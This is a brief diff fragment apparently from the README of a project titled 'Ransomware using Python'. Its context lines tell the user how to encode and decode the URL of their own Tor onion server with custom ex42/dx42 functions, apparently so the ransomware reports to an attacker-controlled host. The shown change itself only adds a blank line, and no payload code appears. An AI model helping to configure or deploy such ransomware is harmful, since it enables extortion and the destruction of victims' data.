@@ -13,6 +13,7 @@ Ransomware using Python 💀💀💀
   YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()
   ```
   (Use the `ex42` function from the `edx42` module to encode your URL first.)
+  
   Example:
   ```python
   encoded_url = ex42(b"https://your-tor-server.onion")
